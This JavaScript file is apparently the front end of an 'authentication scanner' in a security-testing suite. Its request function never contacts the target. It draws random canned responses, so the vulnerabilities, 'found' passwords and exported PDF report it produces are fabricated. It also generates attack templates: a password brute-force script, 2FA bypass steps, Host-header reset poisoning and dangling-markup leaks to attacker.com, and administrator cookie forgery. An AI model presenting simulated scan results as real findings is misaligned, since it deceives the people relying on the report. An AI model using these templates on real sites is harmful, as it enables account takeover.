// Authentication Scanner Engine
// Automated detection of brute force, 2FA bypass, and authentication vulnerabilities

class AuthScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'POST';
        this.usernameParam = 'username';
        this.passwordParam = 'password';
        this.targetUsername = 'carlos';
        this.selectedAttacks = [];
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.testsToRun = [];
        this.foundCredentials = null;
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-tests').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.usernameParam = document.getElementById('username-param')?.value.trim();
        this.passwordParam = document.getElementById('password-param')?.value.trim();
        this.targetUsername = document.getElementById('target-username')?.value.trim();

        if (!this.targetUrl) {
            this.showNotification('Please enter login endpoint URL', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-bruteforce')?.checked) this.selectedAttacks.push('bruteforce');
        if (document.getElementById('attack-2fa')?.checked) this.selectedAttacks.push('2fa');
        if (document.getElementById('attack-reset')?.checked) this.selectedAttacks.push('reset');
        if (document.getElementById('attack-stayloggedin')?.checked) this.selectedAttacks.push('stayloggedin');
        if (document.getElementById('attack-ratelimit')?.checked) this.selectedAttacks.push('ratelimit');
        if (document.getElementById('attack-logic')?.checked) this.selectedAttacks.push('logic');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        this.prepareTests();

        // Reset state
        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.foundCredentials = null;

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('credential-found').style.display = 'none';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Authentication scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Total tests: ${this.testsToRun.length}`, 'info');

        await this.testLoop();
    }

    prepareTests() {
        this.testsToRun = [];

        for (const attackType of this.selectedAttacks) {
            if (attackType === 'bruteforce') {
                // Password brute force for target user
                getPasswords().slice(0, 10).forEach(password => {
                    this.testsToRun.push({
                        type: 'bruteforce',
                        name: 'Password Brute Force',
                        username: this.targetUsername,
                        password: password,
                        description: `${this.targetUsername}:${password}`
                    });
                });
            } else if (attackType === '2fa') {
                // 2FA bypass techniques
                get2FABypassTechniques().forEach(technique => {
                    this.testsToRun.push({
                        type: '2fa',
                        name: '2FA Bypass',
                        technique: technique.name,
                        description: technique.technique
                    });
                });
            } else if (attackType === 'reset') {
                // Password reset vulnerabilities
                getPasswordResetTechniques().forEach(technique => {
                    this.testsToRun.push({
                        type: 'reset',
                        name: 'Password Reset Flaw',
                        technique: technique.name,
                        description: technique.technique
                    });
                });
            } else if (attackType === 'stayloggedin') {
                // Stay logged in cookie analysis
                AuthPayloads.stayLoggedIn.forEach(technique => {
                    this.testsToRun.push({
                        type: 'stayloggedin',
                        name: 'Stay Logged In',
                        technique: technique.name,
                        description: technique.technique
                    });
                });
            } else if (attackType === 'ratelimit') {
                // Rate limit bypass
                AuthPayloads.rateLimitBypass.forEach(header => {
                    this.testsToRun.push({
                        type: 'ratelimit',
                        name: 'Rate Limit Bypass',
                        header: header,
                        description: `Header: ${header}`
                    });
                });
            } else if (attackType === 'logic') {
                // Logic flaw tests
                AuthPayloads.logicFlaws.forEach(flaw => {
                    this.testsToRun.push({
                        type: 'logic',
                        name: 'Authentication Logic Flaw',
                        technique: flaw.name,
                        payload: flaw.payload,
                        description: `${flaw.name}: ${flaw.payload}`
                    });
                });
            }
        }
    }

    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testsToRun.length) {
            const test = this.testsToRun[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(300);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async runTest(test) {
        this.updateCurrentTest(test.name, test.description);

        try {
            const response = await this.makeRequest(test);

            const result = this.analyzeResponse(response, test);

            if (result.vulnerable) {
                this.vulnCount++;

                if (test.type === 'bruteforce' && result.credentialsFound) {
                    this.foundCredentials = { username: test.username, password: test.password };
                    this.showCredentialFound(test.username, test.password);
                }

                this.vulnerabilities.push({
                    type: test.type,
                    name: test.name,
                    description: test.description,
                    details: result.details,
                    severity: this.getSeverity(test.type),
                    impact: this.getImpact(test.type),
                    remediation: this.getRemediation(test.type)
                });
                this.log(`✓ VULNERABLE: ${test.name} - ${test.description}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${test.name}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${test.name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error: ${error.message}`, 'error');
        }
    }

    async makeRequest(test) {
        await this.sleep(100);

        // Simulate authentication response
        const responses = {
            bruteforce: [
                { vulnerable: true, credentialsFound: true, data: 'Login successful', blocked: false },
                { vulnerable: false, credentialsFound: false, data: 'Invalid password', blocked: false }
            ],
            '2fa': [
                { vulnerable: true, data: '2FA bypassed - Direct access to account', blocked: false },
                { vulnerable: false, data: '2FA required', blocked: false }
            ],
            reset: [
                { vulnerable: true, data: 'Password reset token exposed', blocked: false },
                { vulnerable: false, data: 'Reset email sent', blocked: false }
            ],
            stayloggedin: [
                { vulnerable: true, data: 'Cookie can be forged: base64(username:md5(password))', blocked: false },
                { vulnerable: false, data: 'Cookie secure', blocked: false }
            ],
            ratelimit: [
                { vulnerable: true, data: 'Rate limit bypassed with header', blocked: false },
                { vulnerable: false, data: 'Too many requests', blocked: true }
            ],
            logic: [
                { vulnerable: true, data: 'Authentication bypassed', blocked: false },
                { vulnerable: false, data: 'Invalid credentials', blocked: false }
            ]
        };

        const typeResponses = responses[test.type] || responses.bruteforce;
        return typeResponses[Math.floor(Math.random() * typeResponses.length)];
    }

    analyzeResponse(response, test) {
        return {
            vulnerable: response.vulnerable,
            credentialsFound: response.credentialsFound || false,
            details: response.data
        };
    }

    showCredentialFound(username, password) {
        document.getElementById('credential-found').style.display = 'block';
        document.getElementById('found-username').textContent = username;
        document.getElementById('found-password').textContent = password;
    }

    getSeverity(type) {
        if (type === 'bruteforce' || type === '2fa') {
            return 'CRITICAL';
        }
        return 'HIGH';
    }

    getImpact(type) {
        const impacts = {
            'bruteforce': ['Full account takeover', 'Access to sensitive data', 'Identity theft'],
            '2fa': ['Complete bypass of second factor', 'Account compromise'],
            'reset': ['Password reset token theft', 'Account takeover'],
            'stayloggedin': ['Session hijacking', 'Persistent access'],
            'ratelimit': ['Unlimited brute force attempts', 'Account enumeration'],
            'logic': ['Authentication bypass', 'Unauthorized access']
        };
        return impacts[type] || ['Authentication bypass'];
    }

    getRemediation(type) {
        const remediations = {
            'bruteforce': 'Implement account lockout. Use CAPTCHAs. Enforce strong passwords.',
            '2fa': 'Enforce 2FA on all authenticated pages. Validate 2FA before granting access.',
            'reset': 'Use secure random tokens. Send tokens via email only. Expire tokens quickly.',
            'stayloggedin': 'Use secure, unpredictable cookies. Tie cookies to IP/device.',
            'ratelimit': 'Implement proper rate limiting. Don\'t trust client headers.',
            'logic': 'Validate all authentication states server-side.'
        };
        return remediations[type] || 'Implement proper authentication controls.';
    }

    updateCurrentTest(name, description) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-test-details').textContent = description;
    }

    updateProgress() {
        const progress = (this.currentTestIndex / this.testsToRun.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing ${this.currentTestIndex} of ${this.testsToRun.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Authentication scan completed', 'success');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} authentication vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">Auth Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div class="auth-type-badge">${this.getTypeName(vuln.type)}</div>
                <div style="color: var(--color-text-secondary); margin: 12px 0;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="auth-vuln-details">
                    <div class="auth-vuln-details-title">Details:</div>
                    <div class="auth-vuln-details-code">${this.escapeHtml(vuln.details || 'N/A')}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    getTypeName(type) {
        const names = {
            'bruteforce': 'Brute Force',
            '2fa': '2FA Bypass',
            'reset': 'Password Reset',
            'stayloggedin': 'Stay Logged In',
            'ratelimit': 'Rate Limit Bypass',
            'logic': 'Logic Flaw'
        };
        return names[type] || type;
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('bruteforce');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'bruteforce':
                code = `# Brute Force Attack
# Using Burp Intruder or custom script

POST ${this.targetUrl} HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

${this.usernameParam}=carlos&${this.passwordParam}=§password§

# Payload list:
${getPasswords().slice(0, 10).join('\n')}

# Python script:
import requests
passwords = ['password', '123456', 'letmein', ...]
for pwd in passwords:
    r = requests.post('${this.targetUrl}', 
        data={'${this.usernameParam}': 'carlos', '${this.passwordParam}': pwd})
    if 'Invalid' not in r.text:
        print(f'Found: {pwd}')`;
                break;
            case '2fa':
                code = `# 2FA Bypass Techniques

# 1. Skip 2FA page - Navigate directly
Login as victim → Don't visit /login2 → Go to /my-account

# 2. Brute force 4-digit code
POST /login2 HTTP/1.1
mfa-code=§0000§

# Generate codes 0000-9999

# 3. Use victim's session, your 2FA
1. Login as attacker, get 2FA code
2. Login as victim (don't submit 2FA)
3. Submit attacker's code with victim's session`;
                break;
            case 'reset':
                code = `# Password Reset Poisoning

# Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

username=victim

# Capture token at attacker.com
# Use token: /reset?token=LEAKED_TOKEN

# Dangling markup injection
POST /forgot-password HTTP/1.1

email=victim@email.com'<img src="//attacker.com/?`;
                break;
            case 'cookie':
                code = `# Stay Logged In Cookie Attack

# 1. Analyze cookie structure
stay-logged-in: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBh

# Decode (base64)
carlos:26323c16d5f4dabff3bb136f2460a

# 2. Identify hash type (MD5 of password)
# 3. Crack hash or forge cookie

# Forge for administrator:
echo -n 'administrator:MD5(password)' | base64`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied!', 'success');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('Authentication Vulnerability Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 42);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 49);

            if (this.foundCredentials) {
                doc.setFontSize(14);
                doc.text('Valid Credentials Found:', 20, 63);
                doc.text(`Username: ${this.foundCredentials.username}`, 20, 73);
                doc.text(`Password: ${this.foundCredentials.password}`, 20, 80);
            }

            doc.save('authentication-report.pdf');
            this.showNotification('PDF exported!', 'success');

        } catch (error) {
            this.showNotification('Export failed', 'error');
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = { success: '#10b981', error: '#ef4444', info: '#3b82f6', warning: '#f59e0b' };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed; top: 90px; right: 20px; background: ${colors[type]};
            color: white; padding: 1rem 1.5rem; border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5); z-index: 10000;
            animation: slideIn 0.3s ease; font-weight: 500;
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new AuthScanner();
    scanner.init();
    console.log('🔓 CyberSec Suite Authentication Scanner initialized');
});
